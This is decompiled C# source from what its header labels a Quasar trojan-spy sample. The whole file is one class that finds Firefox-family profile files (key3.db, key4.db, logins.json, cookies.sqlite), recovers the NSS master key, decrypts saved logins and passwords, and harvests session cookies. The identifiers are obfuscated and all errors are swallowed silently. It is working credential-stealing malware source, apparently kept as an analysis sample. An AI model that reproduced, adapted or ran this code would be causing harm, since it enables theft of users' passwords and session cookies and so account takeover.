// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.Recovery.hhhh6r
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Data.Gecko;
using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Data.SQLite;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using NoiseMe.Drags.App.Models.Delegates;
using NoiseMe.Drags.App.Models.JSON;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace NoiseMe.Drags.App.Data.Recovery
{
  public class hhhh6r : GH9kf<BrowserProfile>
  {
    public List<BrowserProfile> EnumerateData()
    {
      List<BrowserProfile> browserProfileList = new List<BrowserProfile>();
      try
      {
        List<string> stringList = new List<string>();
        stringList.AddRange((IEnumerable<string>) rcvr.FindPaths(strg.LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
        stringList.AddRange((IEnumerable<string>) rcvr.FindPaths(strg.RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
        foreach (string fileName in stringList)
        {
          string fullName = new FileInfo(fileName).Directory.FullName;
          string str = fileName.Contains(strg.RoamingAppData) ? hhhh6r.prbn(fullName) : hhhh6r.plbn(fullName);
          if (!string.IsNullOrEmpty(str))
          {
            BrowserProfile browserProfile = new BrowserProfile()
            {
              Name = str,
              Profile = new DirectoryInfo(fullName).Name,
              BrowserCookies = new List<BrowserCookie>((IEnumerable<BrowserCookie>) this.CookMhn(fullName)).IsNull<List<BrowserCookie>>(),
              BrowserCredendtials = new List<BrowserCredendtial>((IEnumerable<BrowserCredendtial>) this.Creds(fullName).IsNull<List<BrowserCredendtial>>()).IsNull<List<BrowserCredendtial>>()
            };
            if (browserProfile.BrowserCookies.Count<BrowserCookie>((Func<BrowserCookie, bool>) (x => x.IsNotNull<BrowserCookie>())) > 0 || browserProfile.BrowserCredendtials.Count<BrowserCredendtial>((Func<BrowserCredendtial, bool>) (x => x.IsNotNull<BrowserCredendtial>())) > 0)
              browserProfileList.Add(browserProfile);
          }
        }
      }
      catch (Exception ex)
      {
      }
      return browserProfileList;
    }

    public List<BrowserCredendtial> Creds(string profile)
    {
      List<BrowserCredendtial> browserCredendtialList = new List<BrowserCredendtial>();
      try
      {
        if (File.Exists(Path.Combine(profile, "key3.db")))
          browserCredendtialList.AddRange((IEnumerable<BrowserCredendtial>) this.Lopos(profile, hhhh6r.p3k(rcvr.CreateTempCopy(Path.Combine(profile, "key3.db")))));
        if (File.Exists(Path.Combine(profile, "key4.db")))
          browserCredendtialList.AddRange((IEnumerable<BrowserCredendtial>) this.Lopos(profile, hhhh6r.p4k(rcvr.CreateTempCopy(Path.Combine(profile, "key4.db")))));
      }
      catch (Exception ex)
      {
      }
      return browserCredendtialList;
    }

    public List<BrowserCookie> CookMhn(string profile)
    {
      List<BrowserCookie> browserCookieList = new List<BrowserCookie>();
      try
      {
        string str = Path.Combine(profile, "cookies.sqlite");
        if (!File.Exists(str))
          return browserCookieList;
        CNT cnt = new CNT(rcvr.CreateTempCopy(str));
        cnt.ReadTable("moz_cookies");
        for (int rowIndex = 0; rowIndex < cnt.RowLength; ++rowIndex)
        {
          BrowserCookie browserCookie = (BrowserCookie) null;
          try
          {
            browserCookie = new BrowserCookie()
            {
              Host = cnt.ParseValue(rowIndex, "host").Trim(),
              Http = cnt.ParseValue(rowIndex, "isSecure") == "1",
              Path = cnt.ParseValue(rowIndex, "path").Trim(),
              Secure = cnt.ParseValue(rowIndex, "isSecure") == "1",
              Expires = cnt.ParseValue(rowIndex, "expiry").Trim(),
              Name = cnt.ParseValue(rowIndex, "name").Trim(),
              Value = cnt.ParseValue(rowIndex, "value")
            };
          }
          catch
          {
          }
          if (browserCookie != null)
            browserCookieList.Add(browserCookie);
        }
      }
      catch (Exception ex)
      {
      }
      return browserCookieList;
    }

    public List<BrowserCredendtial> Lopos(string profile, byte[] privateKey)
    {
      List<BrowserCredendtial> browserCredendtialList = new List<BrowserCredendtial>();
      try
      {
        string tempCopy = rcvr.CreateTempCopy(Path.Combine(profile, "logins.json"));
        if (!File.Exists(tempCopy))
          return browserCredendtialList;
        foreach (JsonValue jsonValue in (IEnumerable) File.ReadAllText(tempCopy).FromJSON()["logins"])
        {
          нкрпар нкрпар1 = Апн.Create(Convert.FromBase64String(jsonValue["encryptedUsername"].ToString(false)));
          нкрпар нкрпар2 = Апн.Create(Convert.FromBase64String(jsonValue["encryptedPassword"].ToString(false)));
          string str1 = Regex.Replace(шо67г.lTRjlt(privateKey, нкрпар1.Objects[0].Objects[1].Objects[1].ObjectData, нкрпар1.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
          string str2 = Regex.Replace(шо67г.lTRjlt(privateKey, нкрпар2.Objects[0].Objects[1].Objects[1].ObjectData, нкрпар2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
          BrowserCredendtial browserCredendtial = new BrowserCredendtial()
          {
            URL = string.IsNullOrEmpty(jsonValue["hostname"].ToString(false)) ? "UNKNOWN" : jsonValue["hostname"].ToString(false),
            Login = string.IsNullOrEmpty(str1) ? "UNKNOWN" : str1,
            Password = string.IsNullOrEmpty(str2) ? "UNKNOWN" : str2
          };
          if (browserCredendtial.Login != "UNKNOWN" && browserCredendtial.Password != "UNKNOWN" && browserCredendtial.URL != "UNKNOWN")
            browserCredendtialList.Add(browserCredendtial);
        }
      }
      catch (Exception ex)
      {
      }
      return browserCredendtialList;
    }

    private static byte[] p4k(string file)
    {
      byte[] numArray = new byte[24];
      try
      {
        if (!File.Exists(file))
          return numArray;
        CNT cnt = new CNT(file);
        cnt.ReadTable("metaData");
        string s = cnt.ParseValue(0, "item1");
        нкрпар нкрпар1 = Апн.Create(Encoding.Default.GetBytes(cnt.ParseValue(0, "item2)")));
        byte[] objectData1 = нкрпар1.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
        byte[] objectData2 = нкрпар1.Objects[0].Objects[1].ObjectData;
        р6прлгв р6прлгв1 = new р6прлгв(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData1);
        р6прлгв1.го7па();
        шо67г.lTRjlt(р6прлгв1.DataKey, р6прлгв1.DataIV, objectData2);
        cnt.ReadTable("nssPrivate");
        int rowLength = cnt.RowLength;
        string empty = string.Empty;
        for (int rowIndex = 0; rowIndex < rowLength; ++rowIndex)
        {
          if (cnt.ParseValue(rowIndex, "a102") == Encoding.Default.GetString(strg.Key4MagicNumber))
          {
            empty = cnt.ParseValue(rowIndex, "a11");
            break;
          }
        }
        нкрпар нкрпар2 = Апн.Create(Encoding.Default.GetBytes(empty));
        byte[] objectData3 = нкрпар2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
        byte[] objectData4 = нкрпар2.Objects[0].Objects[1].ObjectData;
        р6прлгв р6прлгв2 = new р6прлгв(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData3);
        р6прлгв2.го7па();
        numArray = Encoding.Default.GetBytes(шо67г.lTRjlt(р6прлгв2.DataKey, р6прлгв2.DataIV, objectData4, PaddingMode.PKCS7));
      }
      catch (Exception ex)
      {
      }
      return numArray;
    }

    private static byte[] p3k(string file)
    {
      byte[] destinationArray = new byte[24];
      try
      {
        if (!File.Exists(file))
          return destinationArray;
        DataTable dataTable = new DataTable();
        ррп6 berkeleyDB = new ррп6(file);
        о6а о6а = new о6а(hhhh6r.vbv(berkeleyDB, (Func<string, bool>) (x => x.Equals("password-check"))));
        string hexString = hhhh6r.vbv(berkeleyDB, (Func<string, bool>) (x => x.Equals("global-salt")));
        р6прлгв р6прлгв1 = new р6прлгв(rcvr.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), rcvr.ConvertHexStringToByteArray(о6а.EntrySalt));
        р6прлгв1.го7па();
        шо67г.lTRjlt(р6прлгв1.DataKey, р6прлгв1.DataIV, rcvr.ConvertHexStringToByteArray(о6а.Passwordcheck));
        нкрпар нкрпар1 = Апн.Create(rcvr.ConvertHexStringToByteArray(hhhh6r.vbv(berkeleyDB, (Func<string, bool>) (x => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt")))));
        р6прлгв р6прлгв2 = new р6прлгв(rcvr.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), нкрпар1.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
        р6прлгв2.го7па();
        нкрпар нкрпар2 = Апн.Create(Апн.Create(Encoding.Default.GetBytes(шо67г.lTRjlt(р6прлгв2.DataKey, р6прлгв2.DataIV, нкрпар1.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
        if (нкрпар2.Objects[0].Objects[3].ObjectData.Length > 24)
          Array.Copy((Array) нкрпар2.Objects[0].Objects[3].ObjectData, нкрпар2.Objects[0].Objects[3].ObjectData.Length - 24, (Array) destinationArray, 0, 24);
        else
          destinationArray = нкрпар2.Objects[0].Objects[3].ObjectData;
      }
      catch (Exception ex)
      {
      }
      return destinationArray;
    }

    private static string vbv(ррп6 berkeleyDB, Func<string, bool> predicate)
    {
      string empty = string.Empty;
      try
      {
        foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
        {
          if (predicate(key.Key))
            empty = key.Value;
        }
      }
      catch (Exception ex)
      {
      }
      return empty.Replace("-", string.Empty);
    }

    private static string prbn(string profilesDirectory)
    {
      string str = string.Empty;
      try
      {
        string[] strArray = profilesDirectory.Split(new string[1]
        {
          "AppData\\Roaming\\"
        }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries);
        str = !(strArray[2] == "Profiles") ? strArray[0] : strArray[1];
      }
      catch (Exception ex)
      {
      }
      return str.Replace(" ", string.Empty);
    }

    private static string plbn(string profilesDirectory)
    {
      string str = string.Empty;
      try
      {
        string[] strArray = profilesDirectory.Split(new string[1]
        {
          "AppData\\Local\\"
        }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries);
        str = !(strArray[2] == "Profiles") ? strArray[0] : strArray[1];
      }
      catch (Exception ex)
      {
      }
      return str.Replace(" ", string.Empty);
    }
  }
}
